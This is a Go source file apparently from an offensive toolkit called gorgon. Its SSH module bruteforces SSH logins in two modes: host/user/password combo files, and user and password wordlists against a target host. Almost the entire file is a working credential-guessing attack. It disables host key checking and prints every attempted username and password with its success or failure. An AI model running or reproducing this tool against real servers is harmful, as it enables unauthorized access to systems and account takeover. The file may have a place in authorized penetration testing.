//	Name: SSH Module
//	Usage: Used for bruteforcing SSH services
//	Credits: github.com/aldenso/sshgobrute
//	Author(s): dru1d, stumblebot

package main

import (
	"log"
	"fmt"
	"errors"
	"strings"
	"sync"
	"time"
	"golang.org/x/crypto/ssh"
	"github.com/dru1d-foofus/gorgon/helpers/files"
	"github.com/fatih/color"
	"github.com/urfave/cli"
)

var (
inittime = time.Now()
sshSubcommands = []cli.Command{
		{
			Name:   "combo",
			Usage:  "uses combo file to guess credential",
			Action: sshCombo,
			Flags: []cli.Flag {
				cli.StringFlag {
					Name:  "file, f",
					Usage: "combo file in tab delimited format: ex. HOST[TAB]USER[TAB]PASS format",
				},
				cli.StringFlag {
					Name:  "port",
					Usage: "port for combo attack",
					Value: "22",
					},
				cli.IntFlag {
					Name: "timeout, t",
					Usage: "set timeout for ssh connection; default 300ms",
					Value: 300,
				},
			},
		},
		{
			Name:	"plaintext",
			Usage:	"uses plaintext credentials to bruteforce",
			Action:	sshPlaintext,
			Flags:	[]cli.Flag {
				cli.StringFlag {
					Name:  "host",
					Usage: "host for bruteforce",
					},
				cli.StringFlag {
					Name:  "hostfile, H",
					Usage: "Insert host files for bruteforce",
					},
				cli.StringFlag {
					Name:	"port",
					Usage:	"Port for bruteforce",
					Value:	"22",
					},
				cli.StringFlag {
					Name:	"user, u",
					Usage:	"User for bruteforce",
					},
				cli.StringFlag {
					Name:	"userfile, U",
					Usage:	"User file for bruteforce",
					},
				cli.StringFlag {
					Name:	"password, p",
					Usage:	"Password for bruteforce",
					},
				cli.StringFlag {
					Name:	"passfile, P",
					Usage:	"Password file for bruteforce",
					},
				cli.IntFlag {
					Name: "timeout,t",
					Usage: "Set timeout for SSH connection; default 300ms",
					Value: 300,
					},
				},
			},
	}

sshBrute = cli.Command {
			Name:		 "ssh",
			Usage:		 "bruteforces SSH services",
			Subcommands: sshSubcommands,
		}
)

type resp struct {
	Error error
	mu sync.Mutex
}


// func readLines(path string) ([]string, error) {
// 	file, err := os.Open(path)
// 	if err != nil {
// 		return nil, err
// 	}
// 	defer file.Close()

// 	var lines []string
// 	scanner := bufio.NewScanner(file)
// 	for scanner.Scan() {
// 		lines = append(lines, scanner.Text())
// 	}
// 	return lines, scanner.Err()
// }


func sshAuth(username string, password string, host string, port string, timer int) *resp {
	respond := &resp{}
	clientConf := &ssh.ClientConfig {
		User:				username,
		HostKeyCallback:	ssh.InsecureIgnoreHostKey(),
		Auth:				[]ssh.AuthMethod{ssh.Password(password)},
		Timeout:			time.Duration(timer)*time.Millisecond,
	}
	_, err := ssh.Dial("tcp", host+":"+ port, clientConf)
	if err != nil {
		fmt.Printf("\nUser: %s Password: %s [%s]", username, password, color.RedString("FAILED"))
	} else if err == nil {
//		end := time.Now()
//		d := end.Sub(inittime)
//		duration := d.Seconds()
		fmt.Printf("\nUser: %s Password: %s [%s]", username, password, color.GreenString("SUCCESS"))
	}
	respond.Error = err
	return respond
}


func sshCombo(c *cli.Context) error {
// combo file logic
	if c.String("file") == "" {
	return errors.New("must supply a combo file to this command")
	}
	if c.String("file") != "" {
		combos, err := files.ReadLines(c.String("file"))
		if err != nil {
			log.Fatalf("readLine: %s", err)
		}
		for combo := range combos {
			combosplice := strings.Split(combos[combo], "\t")
			host,user,password := combosplice[0],combosplice[1],combosplice[2]
//			fmt.Printf("\nUser: %s Password:%s Host: %s", user,password,host)
			resp := sshAuth(user,password,host,c.String("port"),c.Int("timeout"))
			resp.mu.Lock()
			if resp.Error == nil {
				resp.mu.Unlock()
			}
		}
	}
	return nil
}


func sshPlaintext(c *cli.Context) error {
	if c.String("userfile") != "" {
		users, err := files.ReadLines(c.String("userfile"))
		if err != nil {
			log.Fatalf("readLines: %s", err)
		}
		for user := range users {
// userfile + passfile
			if c.String("passfile") != "" {
				passwords, err := files.ReadLines(c.String("passfile"))
				if err != nil {
					log.Fatalf("readLines: %s", err)
				}
				for password := range passwords {
					resp := sshAuth(users[user],passwords[password], c.String("host"),c.String("port"),c.Int("timeout"))
		        	resp.mu.Lock()
	            		if resp.Error == nil {
			        		resp.mu.Unlock()
					}
				}
// userfile + password
			} else {
				resp := sshAuth(users[user],c.String("password"), c.String("host"),c.String("port"),c.Int("timeout"))
				resp.mu.Lock()
					if resp.Error == nil {
						resp.mu.Unlock()
					}
			}
		}
	} else {
// username + passfile
		if c.String("passfile") != "" {
			passwords, err := files.ReadLines(c.String("passfile"))
			if err != nil {
				log.Fatalf("readLine: %s", err)
			}
			for password := range passwords {
				resp := sshAuth(c.String("user"),passwords[password],c.String("host"),c.String("port"),c.Int("timeout"))
				resp.mu.Lock()
					if resp.Error == nil {
						resp.mu.Unlock()
					}
			}
		} else {
// username + password
			resp := sshAuth(c.String("user"),c.String("password"),c.String("host"),c.String("port"),c.Int("timeout"))
			resp.mu.Lock()
				if resp.Error == nil {
					resp.mu.Unlock()
				}
		}
	}
	return nil
}